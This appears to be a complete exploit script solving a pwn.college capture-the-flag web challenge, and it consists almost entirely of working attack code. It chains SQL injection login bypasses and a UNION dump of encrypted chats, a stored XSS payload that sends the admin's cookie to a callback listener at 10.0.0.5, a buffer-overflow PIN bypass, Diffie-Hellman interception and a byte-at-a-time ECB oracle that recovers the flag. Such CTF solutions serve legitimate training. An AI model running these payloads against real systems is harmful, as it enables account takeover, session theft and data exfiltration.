import os
import requests
import re
import sys
import time
import string
from urllib.parse import quote
import http.server
import socketserver
import threading
import urllib.parse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from pwn import *

# Configuration
HOST = "10.0.0.1"
PORT = 80
BASE_URL = f"http://{HOST}:{PORT}"
TARGET_URL = BASE_URL
BLOCK_SIZE = 16

# The IP of the machine running this exploit, accessible by the Admin Bot (Alice)
# In the challenge environment, the hacker container is usually 10.0.0.5
CALLBACK_IP = "10.0.0.5"
CALLBACK_PORT = 9000

GRANT_ACCESS_ADDR = 0x401256
OVERFLOW_PADDING = 88

# NOTE: This must be the actual username of the victim (Sharon) found via MitM
TARGET_SHARON_USER = "sharon10292346158578842163"

DH_p = int.from_bytes(
    bytes.fromhex(
        "FFFFFFFF FFFFFFFF C90FDAA2 2168C234 C4C6628B 80DC1CD1 "
        "29024E08 8A67CC74 020BBEA6 3B139B22 514A0879 8E3404DD "
        "EF9519B3 CD3A431B 302B0A6D F25F1437 4FE1356D 6D51C245 "
        "E485B576 625E7EC6 F44C42E9 A637ED6B 0BFF5CB6 F406B7ED "
        "EE386BFB 5A899FA5 AE9F2411 7C4B1FE6 49286651 ECE45B3D "
        "C2007CB8 A163BF05 98DA4836 1C55D39A 69163FA8 FD24CF5F "
        "83655D23 DCA3AD96 1C62F356 208552BB 9ED52907 7096966D "
        "670C354E 4ABC9804 F1746C08 CA18217C 32905E46 2E36CE3B "
        "E39E772C 180E8603 9B2783A2 EC07A28F B5C55DF0 6F4C52C9 "
        "DE2BCBF6 95581718 3995497C EA956AE5 15D22618 98FA0510 "
        "15728E5A 8AACAA68 FFFFFFFF FFFFFFFF"
    ),
    "big",
)
DH_g = 2


def retrieve_sharon_username():
    print("[*] Step 0: Retrieving Sharon's Username via Alice...")

    s_alice = requests.Session()
    login_payload = "hack' UNION SELECT 'alice', 'dummy', 0 -- "
    s_alice.post(
        f"{TARGET_URL}/login", data={"username": login_payload, "password": "x"}
    )

    injection = "alice' UNION SELECT 'alice', 'dummy', 0 ORDER BY 3 ASC -- "
    modify_url = f"{TARGET_URL}/user/{quote(injection)}/modify"
    s_alice.post(modify_url, data={"password": "hacked"})

    s_mal = requests.Session()
    s_mal.post(
        f"{TARGET_URL}/login",
        data={"username": "hack' UNION SELECT 'mallory', 'x', 0 -- ", "password": "x"},
    )
    s_mal.post(
        f"{TARGET_URL}/chat/alice",
        data={"message": "I heard someone shared the flag with Bob!"},
    )

    dh_a = int.from_bytes(os.urandom(256), "big")
    dh_A = pow(DH_g, dh_a, DH_p)
    msg = f"Hey Bob, I need to chat with you about something important. Let's chat securely over DHE-AES: {dh_A}."
    s_alice.post(f"{TARGET_URL}/chat/bob", data={"message": msg})

    dh_B = None
    dh_B_re = re.compile(r"^bob: Hey Alice, sure: (\d+)\.$", re.MULTILINE)
    for _ in range(30):
        try:
            resp = s_alice.get(f"{TARGET_URL}/chat/bob").text
            match = dh_B_re.search(resp)
            if match:
                dh_B = int(match.group(1))
                break
        except:
            pass
        time.sleep(1)

    if not dh_B:
        print("[-] Bob didn't reply.")
        return

    dh_s = pow(dh_B, dh_a, DH_p)
    key = dh_s.to_bytes(256, "big")[:16]
    cipher_send = AES.new(key, AES.MODE_ECB)
    cipher_recv = AES.new(key, AES.MODE_ECB)
    encrypt_local = lambda data: cipher_send.encrypt(
        pad(data.encode(), cipher_send.block_size)
    ).hex()
    decrypt_local = lambda data: unpad(
        cipher_recv.decrypt(bytes.fromhex(data)), cipher_recv.block_size
    ).decode()

    s_alice.post(
        f"{TARGET_URL}/chat/bob",
        data={
            "message": encrypt_local(
                "Hey Bob, I know that someone shared the flag with you. Who was it?"
            )
        },
    )

    sharon_user = None
    enc_re = re.compile(r"^bob: ([0-9a-f]+)$", re.MULTILINE)
    sharer_re = re.compile(r"Oh, it was '(\w+)'\.")

    for _ in range(10):
        resp = s_alice.get(f"{TARGET_URL}/chat/bob").text
        for em in enc_re.findall(resp):
            try:
                dec = decrypt_local(em)
                match = sharer_re.search(dec)
                if match:
                    sharon_user = match.group(1)
                    break
            except:
                pass
        if sharon_user:
            break
        time.sleep(1)

    if not sharon_user:
        print("[-] Could not retrieve Sharon's username.")
        return
    print(f"[+] Found Sharon's Username: {sharon_user}")

    return sharon_user


def log(msg, type="INFO"):
    print(f"[{type}] {msg}")


def get_session(username, password):
    s = requests.Session()
    r = s.post(f"{BASE_URL}/login", data={"username": username, "password": password})
    if "Hello" in r.text:
        return s
    return None


def register_user(username, password):
    requests.post(
        f"{BASE_URL}/register", data={"username": username, "password": password}
    )


# --- XSS / Admin Stealing Logic ---

admin_cookie = None


class CookieHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        global admin_cookie
        # The payload sends /?c=session=...
        query = urllib.parse.urlparse(self.path).query
        params = urllib.parse.parse_qs(query)
        if "c" in params:
            cookie_str = params["c"][0]
            # Extract the value after "session="
            if "session=" in cookie_str:
                admin_cookie = cookie_str.split("session=")[1].split(";")[0]
                log(f"Received Admin Cookie: {admin_cookie}", "XSS")

        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        return  # Silence server logs


def start_listener():
    handler = CookieHandler
    with socketserver.TCPServer(("0.0.0.0", CALLBACK_PORT), handler) as httpd:
        log(f"Started XSS callback listener on port {CALLBACK_PORT}...", "SETUP")
        while admin_cookie is None:
            httpd.handle_request()


def steal_admin_session():
    """
    1. Hijacks 'mallory' account via SQLi.
    2. Sends XSS payload to 'mallory' chat (which Alice/Admin browses).
    3. Captures Alice's session cookie via the listener.
    """
    global admin_cookie

    # 1. Start Listener in background thread
    t = threading.Thread(target=start_listener)
    t.start()

    # 2. Hijack Mallory
    # Alice browses the chat with Mallory. We need to post the XSS there.
    log("Hijacking Mallory to plant XSS...", "ATTACK")
    bypass_payload = f"' UNION SELECT 'mallory', 'junk', 0 --"
    s_mallory = requests.Session()
    s_mallory.post(
        f"{BASE_URL}/login", data={"username": bypass_payload, "password": "x"}
    )

    if "Hello mallory" not in s_mallory.get(f"{BASE_URL}/").text:
        log("Failed to hijack Mallory.", "ERROR")
        sys.exit(1)

    # 3. Send XSS Payload
    # The payload forces Alice's browser to send her document.cookie to our listener
    xss_payload = f"<script>fetch('http://{CALLBACK_IP}:{CALLBACK_PORT}/?c='+document.cookie)</script>"
    log(f"Sending XSS payload to Alice...", "ATTACK")
    # We must send it to the chat with Alice. Since we are Mallory, the endpoint is /chat/alice (or just /chat/ which redirects)
    # Actually, Alice initiates chat with Mallory. So /chat/alice should work.
    s_mallory.post(f"{BASE_URL}/chat/alice", data={"message": xss_payload})

    # 4. Wait for Cookie
    log("Waiting for Admin Bot to trigger XSS...", "WAIT")
    t.join(timeout=20)  # Wait up to 20 seconds

    if admin_cookie:
        log("Admin session captured!", "SUCCESS")
        s_admin = requests.Session()
        s_admin.cookies.set("session", admin_cookie)
        return s_admin
    else:
        log("Failed to capture admin cookie. Is the bot running?", "ERROR")
        sys.exit(1)


def hijack_bob(password="hacker_pass"):
    log("Hijacking Bob's account...", "SETUP")
    bypass_payload = f"' UNION SELECT 'bob', 'junk', 0 --"
    s = requests.Session()
    s.post(f"{BASE_URL}/login", data={"username": bypass_payload, "password": "x"})

    # We use the buffer overflow payload here to authorize the password change
    pin_payload = (b"A" * OVERFLOW_PADDING) + p64(GRANT_ACCESS_ADDR)

    r = s.post(
        f"{BASE_URL}/user/bob/modify",
        data={"username": "bob", "password": password, "admin_pin": pin_payload},
    )

    if "User modified" in r.text:
        log("Bob hijacked successfully.", "SUCCESS")
        return get_session("bob", password)
    else:
        log("Failed to hijack Bob (PIN Bypass failed?).", "ERROR")
        sys.exit(1)


def print_ciphertext(chats):
    print()
    print("[+] Chats (blocks) - 16bytes chunk")
    for chat in chats:
        print()
        print("[+] Chat :: ", chat)
        n = 32
        blocks = [chat[2][i : i + n] for i in range(0, len(chat[2]), n)]
        for ix, block in enumerate(blocks):
            print("[.] Block ", ix, "::", block)
        print()
    print()


def dump_ciphertexts():
    """
    Extracts encrypted_contents for all chats.
    Returns a list of ciphertext hex strings.
    """
    time.sleep(0.25)
    sql_payload = "' UNION SELECT (SELECT group_concat(IFNULL(encrypted_username_1, 'DELETED') || ':' || IFNULL(encrypted_username_2, 'DELETED') || ':' || IFNULL(encrypted_contents, 'EMPTY'), '||||') FROM encrypted_chats), 'dummy_pass', 0 --"

    resp = requests.post(
        f"{BASE_URL}/login", data={"username": sql_payload, "password": "junk"}
    )

    chats = []

    match = re.search(r"Hello (.*?)! You are", resp.text, re.DOTALL)

    modified_username = ""

    if match:
        raw_dump = match.group(1).strip()
        rows = raw_dump.split("||||")

        candidates = []
        for row in rows:
            parts = row.split(":")
            if len(parts) >= 3:
                u1, u2, content = parts[0], parts[1], parts[2]
                # Look for the chat with a deleted user (Sharon)
                candidates.append((u1, u2, content))

        chats = candidates

    if not chats:
        print("[-] Failed to dump or locate ciphertext with DELETED user.")
        return

    print()
    print("LENGTH OF CHATS")
    print(len(chats))
    print()

    return chats


def normalize_chat_prefixes(admin_s, bob_pass, sharon_user):
    log("Normalizing chat prefixes with PIN Bypass...", "SETUP")
    # Buffer overflow payload
    pin_payload = (b"A" * OVERFLOW_PADDING) + p64(GRANT_ACCESS_ADDR)

    # 1. Rename 'bob' -> 'sharon_user'
    r1 = admin_s.post(
        f"{BASE_URL}/user/bob/modify",
        data={"username": sharon_user, "password": bob_pass, "admin_pin": pin_payload},
    )
    if "must be an admin" in r1.text or r1.status_code == 403:
        log("Admin/PIN check failed during normalization step 1.", "ERROR")

    # 2. Rename 'sharon_user' -> 'bob'
    r2 = admin_s.post(
        f"{BASE_URL}/user/{sharon_user}/modify",
        data={"username": "bob", "password": bob_pass, "admin_pin": pin_payload},
    )
    if "User does not exist" in r2.text:
        log("Failed to rename sharon back to bob.", "ERROR")


def get_block(ct: bytes, n: int) -> bytes:
    """
    Return the nth 16-byte block (1-indexed).
    """
    start = (n - 1) * BLOCK_SIZE * 2
    end = start + BLOCK_SIZE * 2
    return ct[start:end]


def reset_attacker_account(admin_sess, username, password):
    pin_payload = (b"A" * OVERFLOW_PADDING) + p64(GRANT_ACCESS_ADDR)
    admin_sess.post(
        f"{BASE_URL}/user/{username}/modify",
        data={"delete": "Delete User", "admin_pin": pin_payload},
    )
    requests.post(
        f"{BASE_URL}/register", data={"username": username, "password": password}
    )


def attack():
    bob_pass = "password123"
    attacker_user = "attacker"
    attacker_pass = "attacker"

    # 0. Retrieve Sharon's exact username
    TARGET_SHARON_USER = retrieve_sharon_username()

    # 1. Steal Admin Session via XSS (Replaces failing Register SQLi)
    admin_s = steal_admin_session()

    # 2. Setup Helper User
    register_user(attacker_user, attacker_pass)

    # 3. Hijack Bob
    s_bob = hijack_bob(bob_pass)

    # 4. Normalize Sharon's chat to start with "bob: "
    # We pass the ADMIN session here
    normalize_chat_prefixes(admin_s, bob_pass, TARGET_SHARON_USER)

    charset = string.printable
    recovered = b"pwn.college{"
    padding = 75

    if len(TARGET_SHARON_USER) == 25:
        padding = 76

    current_bob_name = "bob"
    counter = 0

    HEADER_LEN = 17
    TARGET_BLOCK_NUM = 10
    TARGET_INDEX = (TARGET_BLOCK_NUM * 16) - 1  # 159

    # Calculate the starting padding required to align the FIRST byte to index 159
    # Formula: Header + Pad = Target_Index
    START_PADDING = TARGET_INDEX - HEADER_LEN

    print(f"[+] Simplified Strategy: Always targeting Block {TARGET_BLOCK_NUM}")
    print(f"[+] Starting Padding: {START_PADDING}")

    pin_payload = (b"A" * OVERFLOW_PADDING) + p64(GRANT_ACCESS_ADDR)

    while b"}" not in recovered:

        # --- A. Linear Padding Calculation ---

        # Simply decrease padding as the recovered flag grows
        current_pad_len = START_PADDING - len(recovered)

        if current_pad_len < 0:
            print(
                "[-] Error: Flag is longer than our buffer! Increase TARGET_BLOCK_NUM."
            )
            break

        padded_username = "bob" + ("A" * current_pad_len)

        print(f"\n[+] Flag: {recovered.decode()}???")
        print(f"[.] Pad: {current_pad_len} | Block: {TARGET_BLOCK_NUM} (CONSTANT)")

        # --- B. Apply the Padding ---

        # Rename user to shift text
        admin_s.post(
            f"{BASE_URL}/user/{current_bob_name}/modify",
            data={
                "username": padded_username,
                "password": bob_pass,
                "admin_pin": pin_payload,
            },
        )
        current_bob_name = padded_username

        print("[+] bob renamed to ::", current_bob_name)

        # --- C. Get the "Truth" Block ---

        chats = dump_ciphertexts()

        print()
        print("---- Truth Ciphertext ----")
        final_chats = []
        final_chats.append(chats[0])
        final_chats.append(chats[-1])
        print_ciphertext(final_chats)
        print()

        # WE ALWAYS EXTRACT THE SAME BLOCK NUMBER
        truth_block = get_block(final_chats[0][-1], TARGET_BLOCK_NUM)

        print("[+] Truth Block ::", truth_block)

        # --- D. Brute Force ---

        found_char = False
        s_bob_brute = requests.Session()
        s_bob_brute.post(
            f"{BASE_URL}/login",
            data={"username": current_bob_name, "password": bob_pass},
        )

        for char in charset:
            guess_payload = b"The flag is " + recovered + char.encode()
            s_bob_brute.post(
                f"{BASE_URL}/chat/{attacker_user}", data={"message": guess_payload}
            )

            chats_new = dump_ciphertexts()

            print()
            print("---- Guess Ciphertext ----")
            final_chats = []
            final_chats.append(chats_new[0])
            final_chats.append(chats_new[-1])
            print_ciphertext(final_chats)
            print()

            # WE ALWAYS CHECK THE SAME BLOCK NUMBER
            guess_block = get_block(final_chats[1][-1], TARGET_BLOCK_NUM)

            print("[+] Truth Block ::", truth_block)
            print("[+] Guess Block ::", guess_block)

            if guess_block == truth_block:
                recovered += char.encode()
                print(f"[!] Match Found! Char: '{char}'")
                print("[+] Recovered Flag: ", recovered.decode())
                found_char = True
                reset_attacker_account(admin_s, attacker_user, attacker_pass)
                break

            reset_attacker_account(admin_s, attacker_user, attacker_pass)


if __name__ == "__main__":
    try:
        attack()
    except KeyboardInterrupt:
        sys.exit(0)
